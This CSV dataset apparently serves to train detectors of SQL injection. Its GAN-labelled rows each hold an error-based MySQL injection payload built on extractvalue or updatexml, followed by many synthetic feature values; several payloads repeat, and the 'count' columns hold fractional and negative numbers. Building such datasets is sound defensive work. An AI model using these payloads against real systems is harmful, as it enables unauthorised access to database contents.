id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000874,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",nearest_attack_euclidean,R000064,6.097138983045784,154.70533752441406,41.67195129394531,41.87632751464844,57.08070373535156,3.5182864665985107,44.319217681884766,21.431148529052734,0.7662981748580933,0.26426640152931213,0.21376056969165802,0.3455413281917572,0.12333084642887115,3.7204174995422363,0.9190992712974548,0.8473606109619141,0.6035913825035095,0.06122191622853279,0.36042320728302,0.46989911794662476,4.223020076751709,6.0483903884887695,6.889870643615723,0.5315377712249756,1.8663520812988281,0.057293910533189774,0.34727951884269714,0.6775516271591187,-0.48510971665382385,-0.027569517493247986,-0.28421586751937866,-0.1572609692811966,3.5640757083892822,-0.004752729088068008,0.42293763160705566,1.884520173072815,3.463855504989624,1.7923589944839478,0.7776556015014648,-0.10748492181301117,0.44383251667022705,0.5854809880256653,-0.04256482422351837,-0.41836124658584595,0.17715327441692352,-0.02485647425055504,-0.2581581771373749,0.08145859837532043,-0.10988672077655792,-0.12813808023929596,0.6655865907669067,-0.22140203416347504,-0.7224634289741516,0.9301576614379883,-0.08268783241510391,0.14554297924041748,-0.2109716534614563,0.36835023760795593,0.5307494401931763,0.47328194975852966,0.47353994846343994,0.44300034642219543,0.9543575048446655,-0.05985786020755768,0.3316633105278015,-0.944165050983429,0.5794338583946228,-0.19792833924293518,0.8068342208862305,0.09646624326705933,-0.7117537260055542,0.904842734336853,1.155216932296753,-0.29273223876953125,0.035497888922691345,0.09341005235910416,1.5685774087905884,0.4064953327178955,-0.11880183219909668,-0.023875977843999863,-0.04060487449169159,4.650629997253418,0.2683257460594177,-0.47065073251724243,0.17621579766273499,0.7628852725028992,-0.6316938400268555,-0.5518516302108765,0.6933097243309021
GAN_000875,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,4.74229047887046,152.0269012451172,46.0930061340332,35.52780532836914,55.74571990966797,1.725225806236267,47.01668167114258,19.93896484375,0.9737199544906616,0.3133193254470825,0.18992891907691956,0.3602150082588196,0.11586938798427582,3.7381997108459473,1.0919620990753174,0.7061870098114014,0.6522144675254822,0.10573862493038177,0.2997194230556488,0.3865799903869629,4.605599403381348,5.861326694488525,5.483824729919434,0.184966042637825,1.5659250020980835,0.08781752735376358,0.18307390809059143,0.4366012513637543,-0.3685256838798523,0.0022545461542904377,0.006627164781093597,0.036025628447532654,2.584304094314575,0.024104023352265358,0.5366371870040894,1.429495096206665,3.4720728397369385,0.9457758069038391,0.9345252513885498,-0.03015744872391224,0.33197617530822754,0.542912483215332,-0.10697321593761444,-0.02130628004670143,0.14110557734966278,-0.03941559046506882,-0.2998409867286682,0.19345495104789734,0.005146161187440157,0.12834660708904266,0.4579055905342102,0.085105299949646,-0.3846307396888733,0.5109135508537292,0.07948139309883118,0.336630254983902,-0.24605035781860352,0.3714316189289093,0.536149263381958,0.36504271626472473,0.25214850902557373,0.38285699486732483,0.28119927644729614,-0.14028224349021912,0.2696700692176819,-0.7329411506652832,0.5168902277946472,-0.16425688564777374,0.45624423027038574,-0.07152752578258514,-0.40264183282852173,0.3914770483970642,0.6935203671455383,-0.3992556929588318,0.017976172268390656,0.06298494338989258,0.8400051593780518,0.2883267402648926,-0.02061605080962181,0.004529997240751982,-0.11509466916322708,5.082635402679443,0.37320491671562195,-0.34185323119163513,0.17391633987426758,0.7486792206764221,-0.30874869227409363,-0.30918702483177185,0.480962336063385
GAN_000876,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.4874824992994515,152.5885467529297,45.5490608215332,38.27897644042969,55.99849319458008,3.3651530742645264,48.08332443237305,20.48430824279785,0.7202072143554688,0.2921696603298187,0.19375969469547272,0.35022789239883423,0.11497588455677032,3.7188103199005127,1.0267345905303955,1.0017142295837402,0.6923956274986267,0.08686763793230057,0.29938289523124695,0.4777200520038605,4.553435325622559,6.659271717071533,6.185237407684326,0.28936150670051575,1.5692447423934937,-0.09663388133049011,0.2548670768737793,0.5462515950202942,-0.5727219581604004,-0.0237466748803854,-0.22892244160175323,-0.2721724510192871,2.763629198074341,0.21594074368476868,0.5356537699699402,1.6048011779785156,3.60998797416687,1.3901368379592896,0.6472916007041931,0.3655910789966583,0.36288920044898987,0.4300757050514221,0.2106710821390152,-0.1656566709280014,0.10409140586853027,-0.3316842019557953,-0.23802053928375244,0.06946370005607605,-0.1208363026380539,-0.16910003125667572,0.5412834882736206,-0.04806943237781525,-0.5766249895095825,0.4540124237537384,-0.234359472990036,0.16287851333618164,0.004434483125805855,0.5907073020935059,0.42069098353385925,0.5207671523094177,0.17875143885612488,0.0785396620631218,0.3863855302333832,0.08790351450443268,0.28377214074134827,-0.7562377452850342,0.6848939061164856,-0.5444241166114807,0.6575820446014404,0.43255728483200073,-0.6030029058456421,0.7802017331123352,0.9529838562011719,-0.34837251901626587,0.014037716202437878,0.07986663281917572,0.9507092833518982,0.2982693612575531,-0.12076038867235184,-0.05790911242365837,-0.16754049062728882,5.7942795753479,0.21541045606136322,-0.42390909790992737,0.16479606926441193,0.6754862070083618,-0.37441402673721313,-0.3180866837501526,0.5395199656486511
GAN_000877,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,5.274407469460806,146.99636840820312,40.922061920166016,38.92045974731445,53.7371940612793,0.6714504361152649,43.791900634765625,20.462358474731445,0.7611732482910156,0.27753257751464844,0.19487221539020538,0.3545979857444763,0.12461426854133606,3.664597272872925,0.9007906913757324,0.8774853944778442,0.6042112112045288,0.032610874623060226,0.3337997794151306,0.3649131953716278,4.40047025680542,5.385132312774658,6.91981315612793,0.5267050862312317,1.6918690204620361,-0.02118995413184166,0.2991359829902649,0.4939733147621155,-0.09768694639205933,-0.029366128146648407,-0.6704570055007935,0.059947192668914795,3.5679397583007812,-0.27320122718811035,0.37372449040412903,1.9232608079910278,3.6594648361206055,1.4812471866607666,0.8872661590576172,0.09418974816799164,0.4261868894100189,0.4536947011947632,-0.11243939399719238,-0.22806672751903534,-0.22670425474643707,-0.21830561757087708,0.16349267959594727,0.09062285721302032,0.0977722704410553,-0.08062301576137543,0.4323682487010956,-0.004964276682585478,-0.49508821964263916,0.45285725593566895,-0.14501649141311646,0.44960537552833557,-0.7003085017204285,0.36015957593917847,0.6030751466751099,0.6341572403907776,-0.042212389409542084,0.33609747886657715,0.47306087613105774,0.07477308064699173,0.20852676033973694,-0.29935726523399353,0.4906533658504486,-0.07323406636714935,0.2511428892612457,-0.0015368983149528503,-0.2680419683456421,0.2871781289577484,0.6787353754043579,-0.3337516784667969,0.004531787242740393,0.05250069126486778,1.0820308923721313,0.48971930146217346,0.1511656790971756,0.07550215721130371,-0.1424194574356079,4.226962089538574,0.2107185423374176,-0.7810115814208984,0.18028798699378967,0.8010013699531555,-0.785814642906189,-0.8433747291564941,0.46664780378341675
GAN_000878,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,5.238339892471775,153.42088317871094,46.45661544799805,36.43519592285156,54.53461837768555,2.3161609172821045,47.44684982299805,20.057275772094727,1.01473069190979,0.30436500906944275,0.20130904018878937,0.3523448407649994,0.12201647460460663,3.7019643783569336,0.5786182284355164,0.48586246371269226,0.6787682175636292,-0.0349460132420063,0.37544575333595276,0.6956586837768555,4.5018720626831055,5.234182834625244,6.3542070388793945,0.214118093252182,1.764782428741455,-0.1908492147922516,0.3681217133998871,0.4302041828632355,-0.44473394751548767,-0.018091712146997452,-0.27493125200271606,-0.0930745005607605,3.379819869995117,0.0015556272119283676,0.4036707282066345,1.5868645906448364,3.6340906620025635,1.5260130167007446,0.5781310796737671,-0.09407544136047363,0.38235414028167725,0.6577784419059753,-0.14063112437725067,-0.1373942345380783,-0.20295536518096924,-0.07447965443134308,0.1501864790916443,0.12604396045207977,0.12272582948207855,-0.14010067284107208,0.5213693976402283,-0.01000697910785675,-0.39600300788879395,0.6306918859481812,-0.05872052162885666,0.29698413610458374,-0.398090124130249,0.42304396629333496,0.2996632158756256,0.48444077372550964,0.2666466534137726,-0.03824944049119949,0.4662744700908661,-0.09322947263717651,0.18512803316116333,-0.5053713321685791,0.6422789692878723,-0.009510554373264313,0.5012971758842468,-0.18141546845436096,-0.5318061709403992,0.562981367111206,0.6822674870491028,-0.2526762783527374,0.020623402670025826,0.04637152701616287,0.9746344685554504,0.38267844915390015,-0.02301752381026745,0.03180868178606033,-0.028818119317293167,4.120051860809326,0.22890180349349976,-0.6117077469825745,0.23375006020069122,0.6587467193603516,-0.6373012661933899,-0.514069676399231,0.2772471308708191
GAN_000879,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000125,5.704967381571277,152.8374481201172,45.85090637207031,38.53733444213867,55.96009063720703,4.878815650939941,46.1368522644043,19.924091339111328,0.7794637680053711,0.28099745512008667,0.2100890725851059,0.3444274663925171,0.11834096908569336,3.71573805809021,0.4637771248817444,0.4759337604045868,0.7835096716880798,0.06203281506896019,0.37474340200424194,0.6620485186576843,4.348313331604004,5.985477447509766,6.524177074432373,0.13090679049491882,1.9108368158340454,-0.15697884559631348,0.38706740736961365,0.4986463785171509,-0.6378375887870789,-0.04168364778161049,-0.14622268080711365,-0.37538278102874756,3.783600330352783,-0.032725851982831955,0.4896961748600006,1.6000044345855713,3.737647533416748,1.7210584878921509,0.46093520522117615,0.03976103290915489,0.434637188911438,0.7461540102958679,0.020260503515601158,-0.1908903270959854,-0.01198497787117958,-0.056420423090457916,-0.03190955892205238,0.00615178095176816,-0.049741193652153015,-0.35070887207984924,0.5747688412666321,-0.18175514042377472,-0.521843671798706,0.5244185328483582,-0.17350435256958008,0.2822920083999634,0.010204626247286797,0.3109707832336426,0.3893795311450958,0.47409385442733765,0.20205748081207275,0.04704546928405762,0.8371447324752808,-0.07912848889827728,0.14097371697425842,-0.634324848651886,0.8281120657920837,-0.02040944993495941,0.8052380084991455,-0.05994922295212746,-0.7862240672111511,0.8012713193893433,1.0440559387207031,-0.4716304540634155,0.0293748639523983,0.06530344486236572,1.235986351966858,0.3908323645591736,-0.16042016446590424,-0.021207455545663834,0.10553301125764847,5.501604080200195,0.19066160917282104,-0.5805356502532959,0.26934152841567993,0.6180943250656128,-0.34777677059173584,-0.2703667879104614,0.2927210330963135
GAN_000880,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.200258410105978,150.65682983398438,46.72170639038086,38.52989196777344,54.625850677490234,0.6828456521034241,47.702491760253906,21.195478439331055,0.937689483165741,0.30535051226615906,0.18534033000469208,0.35518595576286316,0.11361455172300339,3.756167411804199,1.1545768976211548,0.9864787459373474,0.7082912921905518,0.12268863618373871,0.2573517858982086,0.22766999900341034,4.600975036621094,6.235300540924072,5.343855857849121,0.21439515054225922,1.4871712923049927,0.1321103721857071,0.009518332779407501,0.4985436797142029,-0.36519089341163635,-0.027100473642349243,-0.21376673877239227,-0.12688037753105164,2.4829204082489014,-0.0015013925731182098,0.592905580997467,1.664767861366272,3.2574288845062256,1.1039389371871948,0.7677510976791382,0.23526950180530548,0.3506876826286316,0.5756864547729492,0.11177152395248413,-0.0753704234957695,0.07738582789897919,-0.2731964886188507,-0.15570396184921265,0.14424285292625427,-0.09876106679439545,0.04930196702480316,0.3977588415145874,0.14809782803058624,-0.3604639172554016,0.4282952547073364,-0.009803421795368195,0.4670192003250122,-0.3695826828479767,0.6003064513206482,0.5535266995429993,0.4602207839488983,0.2285889983177185,0.29066914319992065,0.13983003795146942,0.03784193843603134,0.31990018486976624,-0.4666062295436859,0.4767446219921112,-0.5902640223503113,0.6176865696907043,0.01604912057518959,-0.5445255637168884,0.3454956114292145,0.7866234183311462,-0.5458618998527527,0.008883237838745117,0.07073809206485748,0.9453626275062561,0.23660650849342346,-0.05591636151075363,-0.0019470646511763334,-0.23690447211265564,4.714663028717041,0.2282160371541977,-0.34705933928489685,0.225713312625885,0.7132731080055237,-0.4212436079978943,-0.4307595491409302,0.7051510214805603
GAN_000881,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000125,5.401076201459037,152.62814331054688,46.97921371459961,37.03485107421875,55.365081787109375,2.6870570182800293,49.7569465637207,19.51243782043457,0.8102768063545227,0.3075557053089142,0.1645783632993698,0.3481261730194092,0.11029414087533951,3.746229410171509,0.8251588344573975,0.43508943915367126,0.6814817786216736,0.011539901606738567,0.37849825620651245,0.6197969913482666,4.542074680328369,5.67422342300415,6.32401704788208,0.2682013511657715,1.92906653881073,-0.06397639214992523,0.2781067490577698,0.3216557800769806,-0.40588924288749695,0.004710789304226637,-0.04589647799730301,-0.2828710079193115,3.4284839630126953,0.23631012439727783,0.48880696296691895,1.4275907278060913,3.4302377700805664,1.3324021100997925,0.554578959941864,0.13275882601737976,0.38492387533187866,0.6242533326148987,-0.08077550679445267,-0.07998728007078171,0.3080796003341675,-0.09837415814399719,-0.15868155658245087,0.07542072236537933,0.00907987356185913,-0.22448070347309113,0.45246195793151855,0.007828295230865479,-0.35254013538360596,0.39080414175987244,-0.07810043543577194,0.3235565721988678,-0.29698091745376587,0.21747706830501556,0.7426294684410095,0.537489116191864,-0.03823765739798546,0.09931334853172302,0.6177570819854736,-0.0686214491724968,0.3075253665447235,-0.5917897820472717,0.5824913382530212,0.069285087287426,0.6579139828681946,0.04042786732316017,-0.4718801975250244,0.41957488656044006,0.7168949246406555,-0.4218422472476959,0.02137739397585392,0.06331001222133636,1.0450435876846313,0.3236997425556183,-0.0752878487110138,-0.046972017735242844,0.002836981788277626,4.8319549560546875,0.23789483308792114,-0.48906877636909485,0.19473695755004883,0.6419841051101685,-0.4288974106311798,-0.3800715506076813,0.3691710829734802
GAN_000882,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.257463275410449,157.54486083984375,41.532711029052734,39.917755126953125,53.46727752685547,2.0824475288391113,45.1893310546875,20.623010635375977,0.7748825550079346,0.26202887296676636,0.2203921675682068,0.3364166021347046,0.12181748449802399,3.802182912826538,0.6043373346328735,0.4352453351020813,0.40594086050987244,-0.05944404378533363,0.4843396246433258,0.6133143901824951,4.205411911010742,4.969788551330566,6.503997325897217,0.22587789595127106,1.675490140914917,-0.2792782783508301,0.7772311568260193,0.3715580999851227,-0.37503066658973694,-0.039467133581638336,-0.4667011499404907,-0.15171116590499878,4.206542491912842,0.20058834552764893,0.31964990496635437,1.6299291849136353,3.50555682182312,1.8185402154922485,0.3398032486438751,0.437073677778244,0.316694051027298,0.4176303446292877,0.19602090120315552,-0.2189330905675888,-0.2089357227087021,0.03094933182001114,0.2623855769634247,0.014983192086219788,-0.19248713552951813,-0.5148634910583496,0.37991154193878174,-0.23545251786708832,-0.20811007916927338,0.07853473722934723,-0.31305375695228577,0.1728326380252838,0.015583928674459457,0.2301342785358429,0.25890758633613586,0.7904775738716125,-0.14423644542694092,-0.24949273467063904,0.5602197647094727,-0.02368035912513733,0.1119442731142044,-0.2849730849266052,0.8132144212722778,0.11883069574832916,0.45967617630958557,-0.03453950956463814,-0.5645899176597595,0.5424333810806274,0.36759495735168457,-0.2162855714559555,0.007839773781597614,0.06719054281711578,1.0760090351104736,0.6143180727958679,-0.26848626136779785,-0.01148149836808443,0.035863712430000305,4.5875396728515625,0.2957436144351959,-0.7437960505485535,0.1276661902666092,0.7516503930091858,-0.42474302649497986,-0.664917528629303,0.3280413746833801
GAN_000883,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,4.806208838233201,152.87510681152344,45.8754997253418,37.83967208862305,55.31352996826172,1.9678224325180054,45.29838562011719,20.851764678955078,1.1264382600784302,0.3063220679759979,0.1985674649477005,0.35329926013946533,0.12177321314811707,3.7278287410736084,0.9434472322463989,0.6156371235847473,0.8596370220184326,0.06748304516077042,0.34278228878974915,0.23316124081611633,4.5051398277282715,5.872168064117432,5.494597911834717,0.32816916704177856,1.4259357452392578,0.21235592663288116,0.15139423310756683,0.5507110357284546,-0.32253050804138184,-0.020819276571273804,-0.05413021147251129,-0.109457828104496,2.8037211894989014,0.09620752185583115,0.524653971195221,1.6941325664520264,3.5953328609466553,1.0559500455856323,0.9179192781448364,-0.06932324916124344,0.35698777437210083,0.5811672806739807,0.03773915767669678,-0.05804463103413582,0.14907000958919525,-0.04093286022543907,-0.1543627828359604,0.20310313999652863,0.009959176182746887,0.05434863269329071,0.5000902414321899,0.09577615559101105,-0.3667665123939514,0.4722152352333069,0.09057869017124176,0.08146350085735321,-0.3419361412525177,0.21553201973438263,0.4616559147834778,0.35717806220054626,0.30530962347984314,0.39338427782058716,0.1901319921016693,-0.12894484400749207,0.2685861885547638,-0.38686662912368774,0.43401166796684265,-0.2447357177734375,0.37653496861457825,-0.08819983899593353,-0.47280028462409973,0.25153955817222595,0.5207935571670532,-0.3386039733886719,0.0207363311201334,0.04824633151292801,1.0295523405075073,0.288408488035202,-0.16952860355377197,0.04314418137073517,-0.16316795349121094,4.4869818687438965,0.28385066986083984,-0.23040014505386353,0.1736401468515396,0.6832689642906189,-0.39493393898010254,-0.37742751836776733,0.5607635974884033
GAN_000884,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,5.812222482167078,150.59188842773438,46.79928207397461,37.64466094970703,53.8386116027832,1.0478657484054565,51.5569953918457,19.883216857910156,0.8218550086021423,0.3014097213745117,0.17440363764762878,0.35009849071502686,0.10737279057502747,3.7310380935668945,1.0299692153930664,0.5730664730072021,0.46948540210723877,0.04318275675177574,0.4197143018245697,0.3306882083415985,4.368642807006836,5.778061389923096,6.077186584472656,0.4335686266422272,1.8966726064682007,-0.05025292932987213,0.07924187183380127,0.5680473446846008,-0.4505336284637451,-0.0037094675935804844,-0.14688096940517426,-0.08538442105054855,3.284851551055908,0.3393390476703644,0.5007502436637878,1.5581939220428467,3.3576624393463135,1.3637583255767822,0.5304462313652039,0.2389036864042282,0.3375738859176636,0.6971481442451477,0.04245314002037048,-0.07563897222280502,-0.10684175789356232,0.0013497620820999146,-0.02512013539671898,0.16290204226970673,0.022270873188972473,-0.25499215722084045,0.548098623752594,-0.03804744780063629,-0.35983043909072876,0.3188488185405731,-0.2798725962638855,0.5776905417442322,-0.41654813289642334,0.5121219754219055,0.6040905117988586,0.8207709193229675,0.049507986754179,0.056692708283662796,0.5489150285720825,0.04830172657966614,0.333101361989975,-0.8399634957313538,0.4669387936592102,-0.0458667129278183,0.8954670429229736,0.10651157796382904,-0.642479658126831,0.5713467001914978,1.0970311164855957,-0.18639811873435974,0.001985673326998949,0.07538479566574097,1.0892181396484375,0.2306540608406067,-0.06610880047082901,-0.04059242829680443,0.1057119369506836,4.975167751312256,0.21610526740550995,-0.4691738188266754,0.13558456301689148,0.7695068120956421,-0.6940391659736633,-0.3525332808494568,0.5558964014053345
GAN_000885,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,4.814075749282841,149.22259521484375,43.54646301269531,38.135581970214844,53.55563735961914,1.3508270978927612,44.87434005737305,19.374048233032227,0.8623903393745422,0.2923290431499481,0.1783803552389145,0.351955771446228,0.11256704479455948,3.696303129196167,0.9749780893325806,0.6158803105354309,0.5336808562278748,0.11410307139158249,0.36442896723747253,0.12813739478588104,4.362734794616699,5.595877170562744,5.886601448059082,0.31522586941719055,1.6702709197998047,-0.3088822364807129,0.37541189789772034,0.4696055054664612,-0.27465569972991943,-0.01673980988562107,-0.2996041774749756,-0.11221802979707718,3.264667272567749,0.19725537300109863,0.541961669921875,1.5777019262313843,3.5271501541137695,1.2537727355957031,0.6169350147247314,0.3686031401157379,0.30034294724464417,0.40477409958839417,0.15571175515651703,-0.0202208049595356,-0.15506605803966522,-0.07941456139087677,-0.04059232398867607,0.14130493998527527,0.023315802216529846,-0.18966983258724213,0.45630842447280884,-0.03998906910419464,-0.28331831097602844,0.17084082961082458,-0.32117024064064026,0.3450741171836853,-0.3842022716999054,0.32878348231315613,0.5515412092208862,0.580909252166748,-0.06284185498952866,0.23706187307834625,0.3551127314567566,0.10027849674224854,0.22787418961524963,-0.4892374575138092,0.5232526659965515,-0.24619603157043457,0.4175051748752594,-0.006656825542449951,-0.466623991727829,0.4420425295829773,0.6715213656425476,-0.265942245721817,0.019494328647851944,0.05581654608249664,0.8812490701675415,0.33987632393836975,0.06707040965557098,-0.007086012978106737,0.2858917713165283,5.111043930053711,0.17653152346611023,-0.42803335189819336,0.11322341859340668,0.7341960668563843,-0.6018826961517334,-0.4234238862991333,0.3220362067222595
GAN_000886,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,6.380453433124636,157.936279296875,39.50006103515625,46.973976135253906,55.66514587402344,3.957008123397827,43.52799987792969,22.331960678100586,0.8114337921142578,0.24346235394477844,0.23691792786121368,0.32632431387901306,0.13839644193649292,3.7711341381073,0.4939863383769989,0.6604803204536438,0.7845537066459656,0.07749763131141663,0.3593328595161438,0.4247387945652008,3.9598560333251953,5.405425548553467,7.297662258148193,0.4671068787574768,2.139204740524292,-0.01883735880255699,0.8189293146133423,0.38831302523612976,-0.3402513265609741,-0.06262870132923126,-0.22341011464595795,-0.1707943081855774,4.599065780639648,0.03899854049086571,0.3794267773628235,2.0073959827423096,3.3983497619628906,2.2685186862945557,0.4217561185359955,0.13852907717227936,0.5842580795288086,0.49972689151763916,-0.1395988166332245,-0.3659363389015198,0.01333077996969223,-0.29682299494743347,0.12274013459682465,0.0013173375045880675,-0.21809209883213043,-0.49102917313575745,0.5830400586128235,-0.3174031674861908,-0.4603921175003052,0.8575171232223511,-0.030138544738292694,-0.05664336308836937,-0.137363463640213,0.36541035771369934,0.7145588994026184,0.8270946145057678,0.5114139318466187,0.4599303603172302,0.990795373916626,0.06974343955516815,0.17207877337932587,-0.5113230347633362,0.7086640000343323,-0.021515876054763794,0.7101372480392456,-0.28990647196769714,-0.5528659224510193,1.1761221885681152,0.7402440905570984,-0.6750423312187195,0.02024427056312561,0.07454334199428558,1.5830485820770264,0.7285811305046082,-0.38580620288848877,0.05871880054473877,-0.20962882041931152,4.004673004150391,0.37146154046058655,-1.2173478603363037,0.11003120988607407,0.6917910575866699,-0.3165023624897003,-0.8442414999008179,0.5119004249572754
GAN_000887,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",nearest_attack_euclidean,R000013,6.77399128287831,151.8531036376953,39.26197814941406,51.42019271850586,56.68978500366211,1.6940290927886963,47.34373092651367,22.320154190063477,0.6666744947433472,0.24597026407718658,0.20958048105239868,0.3490871489048004,0.11967655271291733,3.6887991428375244,0.9712852835655212,1.47921884059906,0.9391433596611023,0.047975312918424606,0.3545459806919098,0.35834458470344543,4.229459285736084,6.480064392089844,7.786341667175293,0.7228571176528931,1.7001389265060425,0.2429569661617279,0.4633982479572296,0.8080306649208069,-0.41386014223098755,-0.022175628691911697,-0.519734263420105,-0.15195277333259583,3.808884382247925,0.046116627752780914,0.3456284999847412,2.0818030834198,3.3523077964782715,1.8329179286956787,0.7487112879753113,0.09543497860431671,0.568528950214386,0.4958288371562958,0.17090053856372833,-0.38640832901000977,0.4294734597206116,-0.1361415982246399,-0.13873495161533356,-0.005972787272185087,-0.3291344940662384,-0.14627917110919952,0.5925053358078003,-0.34243300557136536,-0.8542752265930176,1.0022904872894287,-0.11218302696943283,0.49018481373786926,-0.1980472356081009,0.7037748098373413,0.7109751105308533,0.9468927383422852,0.5759631991386414,0.3686245381832123,0.9233325719833374,0.15716210007667542,0.3049655258655548,-0.7556763887405396,0.4112866520881653,-0.3960065245628357,1.0254321098327637,0.20240704715251923,-0.48538923263549805,0.7380250692367554,0.9907971620559692,-0.3151231110095978,-0.005813642870634794,0.10701136291027069,1.5106109380722046,0.5105939507484436,-0.10882499814033508,0.02416292019188404,-0.42998141050338745,3.6737477779388428,0.49361932277679443,-0.6296867728233337,0.22800643742084503,0.7654843330383301,-0.6300686597824097,-0.69808030128479,1.1289416551589966
